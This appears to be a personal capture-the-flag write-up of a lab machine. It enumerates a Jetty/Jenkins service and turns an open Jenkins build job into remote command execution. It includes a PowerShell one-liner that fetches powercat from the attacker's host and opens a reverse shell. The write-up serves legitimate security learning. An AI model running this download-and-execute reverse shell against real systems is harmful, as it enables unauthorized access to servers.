![[Pasted image 20250923200203.png]]

if i hit search on hello, im presented a crazy err:
![[Pasted image 20250923200236.png]]

port 50000:
![[Pasted image 20250923200256.png]]

i will rip a gobuster or forexbuster:
```
feroxbuster -u http://10.10.10.63:50000
```
returned nothing....

lets try gobuster:
```
gobuster dir -u http://10.10.10.63:50000/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -t 50 -x php,html,txt
```

also nothing.... let me look more into Jetty...
found this: https://www.exploit-db.com/raw/50438

i will run gobuster one more time but this time i will use a bigger and better wordlist to completely rule this out... could be a bunny hole if we dont find anything and also non raft wordlist:
```
gobuster dir -u http://10.10.10.63:50000/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x php,html,txt

this is DevOps pipeline platform called Jenkins(i use this every single day at work lol)

i see a login and do a google search for default creds:
```
There isn't a single "default Jenkins login" because the initial admin password is randomly generated and stored in a file on the Jenkins server, typically found at
$JENKINS_HOME/secrets/initialAdminPassword
```
interesting...
![[Pasted image 20250923201728.png]]

i am able to add credentials... usually this is used so that pipeline scripts can grab vars and use them without putting them in plaintext in the jenkins scripts

i am also able to create a job and in that job i can easily run a command on target:
ill create a job called "bomb" and add the below
![[Pasted image 20250923202247.png]]

when i run the job the output is:
```
Building in workspace C:\Users\Administrator\.jenkins\workspace\bomb
[bomb] $ cmd /c call C:\Users\kohsuke\AppData\Local\Temp\jenkins6106421549052884824.bat

C:\Users\Administrator\.jenkins\workspace\bomb>whoami
jeeves\kohsuke

C:\Users\Administrator\.jenkins\workspace\bomb>exit 0 
Finished: SUCCESS
```

confirmed RCE!

let throw a rev shell in there and get in!

first ill move powercat.ps1 to my working dir then:
```
powershell.exe -NoP -NonI -W Hidden -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.16/powercat.ps1'); powercat -c 10.10.14.16 -p 4444 -e cmd"

```

start my netcat listener on port 4444, and run the job!

check listener and i am in as `kohsuke`

lets get user flag on their desktop:
```
C:\Users\kohsuke\Desktop>type user.txt
type user.txt
e3232272596fb4************
```

User PWNED!
